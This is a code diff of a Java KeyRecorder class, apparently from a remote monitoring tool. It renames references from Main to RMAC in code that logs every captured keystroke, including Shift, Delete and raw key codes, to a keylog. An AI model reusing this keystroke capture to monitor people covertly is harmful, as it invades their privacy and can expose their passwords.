@@ -1,6 +1,6 @@
 package com.rmac.core;
 
-import com.rmac.Main;
+import com.rmac.RMAC;
 import com.rmac.utils.Constants;
 import com.rmac.utils.PipeStream;
 import java.io.BufferedReader;
@@ -111,19 +111,19 @@ public class KeyRecorder implements NativeKeyListener {
       }
       case "Shift": {
         isShift = true;
-        Main.keyLog.println("[Shift|" + nke.getKeyLocation() + "]");
+        RMAC.keyLog.println("[Shift|" + nke.getKeyLocation() + "]");
         break;
       }
       case "Delete": {
-        Main.keyLog.println("[Delete|" + nke.getKeyLocation() + "]");
+        RMAC.keyLog.println("[Delete|" + nke.getKeyLocation() + "]");
         break;
       }
       case "Enter": {
-        Main.keyLog.println();
+        RMAC.keyLog.println();
         break;
       }
       case "Space": {
-        Main.keyLog.print(" ");
+        RMAC.keyLog.print(" ");
         break;
       }
       case "Tab":
@@ -159,7 +159,7 @@ public class KeyRecorder implements NativeKeyListener {
       case "Num Lock":
       case "Print Screen":
       case "Escape":
-        Main.keyLog.println("[" + key + "]");
+        RMAC.keyLog.println("[" + key + "]");
         break;
       case "Back Quote":
       case "Comma":
@@ -182,18 +182,18 @@ public class KeyRecorder implements NativeKeyListener {
       case "8":
       case "9":
       case "0":
-        Main.keyLog.print(getDual(key));
+        RMAC.keyLog.print(getDual(key));
         break;
       default: {
         if (key.contains("Unknown")) {
           if (code.equals("a1")) {
             isShift = true;
-            Main.keyLog.println("[Shift|" + nke.getKeyLocation() + "]");
+            RMAC.keyLog.println("[Shift|" + nke.getKeyLocation() + "]");
           } else {
-            Main.keyLog.println("[0x" + code + "]");
+            RMAC.keyLog.println("[0x" + code + "]");
           }
         } else {
-          Main.keyLog.print(isCaps == isShift ? key.toLowerCase() : key);
+          RMAC.keyLog.print(isCaps == isShift ? key.toLowerCase() : key);
         }
       }
     }
